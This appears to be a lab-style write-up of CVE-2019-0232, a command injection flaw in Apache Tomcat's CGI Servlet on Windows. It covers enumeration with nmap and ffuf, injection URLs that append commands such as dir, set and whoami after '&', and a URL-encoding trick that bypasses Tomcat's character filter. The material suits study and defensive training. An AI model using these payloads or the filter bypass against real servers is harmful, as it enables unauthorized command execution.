
- `CVE-2019-0232` is a critical security issue that could result in remote code execution
- affects Windows systems that have the `enableCmdLineArguments` feature enabled
- Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93`

The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM. 
These external applications are typically CGI scripts written in languages like Perl, Python, or Bash. 
The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing.

In essence, a CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification. It is a middleware between web servers and external information resources like databases.

The `enableCmdLineArguments` setting for Apache Tomcat's CGI Servlet controls whether command line arguments are created from the query string
If set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments.

---
Example-

Search a book by title
```url
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

Search a book by author
```url
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```

A problem arises when `enableCmdLineArguments` is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script. This can lead to an operating system command injection attack, which allows an attacker to execute arbitrary commands on the target system by injecting them into another command.

For instance, an attacker can append `dir` to a valid command using `&` as a separator to execute `dir` on a Windows system. If the attacker controls the input to a CGI script that uses this command, they can inject their own commands after `&` to execute any command on the server. An example of this is `http://example.com/cgi-bin/hello.bat?&dir`, which passes `&dir` as an argument to `hello.bat` and executes `dir` on the server. As a result, an attacker can exploit the input validation error of the CGI Servlet to run any command on the server.


---
## Enumeration
```shell
nmap -p- -sC -Pn 10.129.204.227 --open -vv
```
![[Pasted image 20260403224448.png]]
We see that Nmap has identified `Apache Tomcat/9.0.17` running on port `8080`

#### Finding a CGI script

One way to uncover web server content is by utilising the `ffuf` web enumeration tool along with the `dirb common.txt` wordlist.

The default directory for CGI scripts is `/cgi`

 we can use the URL 
 
 `http://10.129.204.227:8080/cgi/FUZZ.cmd` 
 or 
 `http://10.129.204.227:8080/cgi/FUZZ.bat`
 
  to perform fuzzing.

#### Fuzzing Extentions - .CMD
```shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```
![[Pasted image 20260403231743.png]]
#### Fuzzing Extentions - .BAT
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```
![[Pasted image 20260403233231.png]]

Navigating to the discovered URL at `http://10.129.204.227:8080/cgi/welcome.bat` returns a message:

`Welcome to CGI, this section is not functional yet. Please return to home page.`

---
## Exploitation

we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`. We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`

 ```
 http://10.129.204.227:8080/cgi/welcome.bat?&dir
 ```
 ![[Pasted image 20260403233417.png]]

Navigating to the above URL returns the output for the `dir` batch command, however trying to run other common windows command line apps, such as `whoami` doesn't return an output.

Retrieve a list of environmental variables by calling the `set` command:

```
http://10.129.204.227:8080/cgi/welcome.bat?&set`
```
![[Pasted image 20260403233508.png]]

From the list, we can see that the `PATH` variable has been unset, so we will need to hardcode paths in requests:

`http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`
![[Pasted image 20260403233550.png]]

The attempt was unsuccessful, and Tomcat responded with an error message indicating that an invalid character had been encountered. Apache Tomcat introduced a patch that utilises a regular expression to prevent the use of special characters. However, the filter can be bypassed by URL-encoding the payload.

`http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`

![[Pasted image 20260403233635.png]]

